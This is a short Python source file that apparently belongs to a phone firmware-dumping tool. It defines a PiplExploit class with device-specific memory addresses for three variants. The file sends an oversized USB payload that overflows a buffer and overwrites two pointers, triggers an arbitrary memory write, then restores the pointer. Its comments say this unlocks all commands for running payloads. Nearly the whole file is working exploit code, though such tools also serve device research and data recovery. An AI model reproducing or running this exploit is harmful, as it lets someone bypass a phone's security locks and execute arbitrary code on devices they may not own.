import struct

from dump.pipl.pipl_protocol import PiplProtocol


class PiplExploit(PiplProtocol):

    def parse_opts(self, opts):
        super().parse_opts(opts)

        flavor = opts["exploit_flavor"]
        if flavor == "A":
            self.ptr_to_zero = 0x22
            self.ptr_to_write = 0x8000525f
            self.restore_setup = 0x80026bb6
            self.overflow_bytes = 0x807d
        elif flavor == "B":
            self.ptr_to_zero = 0x81142a69
            self.ptr_to_write = 0x8110029a
            self.restore_setup = 0x81142a16
            self.overflow_bytes = 0x807d
        elif flavor == "C":
            self.ptr_to_zero = 0x81162ab4
            self.ptr_to_write = 0x811402ba
            self.restore_setup = 0x81162a5c
            self.overflow_bytes = 0x8097


    def execute(self, dev, output):
        super().execute(dev, output)

        # overwrite two pointers: pointer to setup's EP (must point to a zero byte), pointer to setup buffer contents (used for arb write)
        data = self.comm(0x20, variable_payload=b"\x00" * self.overflow_bytes + struct.pack("<II", self.ptr_to_zero, self.ptr_to_write))
        try:
            # trigger write to controlled ptr
            self.dev.ctrl_transfer(0x80, 0x06, 0x100, 0x100, 0x100)
        except Exception:
            pass

        # restore original contents
        self.comm_oneway(0x20, variable_payload=b"\x00" * self.overflow_bytes + struct.pack("<II", self.ptr_to_zero, self.restore_setup))

        # at this point all commands should be unlocked
        print("!! Restart the phone before running another payload !!")

        # init for payload exec mode
        self.comm(3, variable_payload=b"\x00")
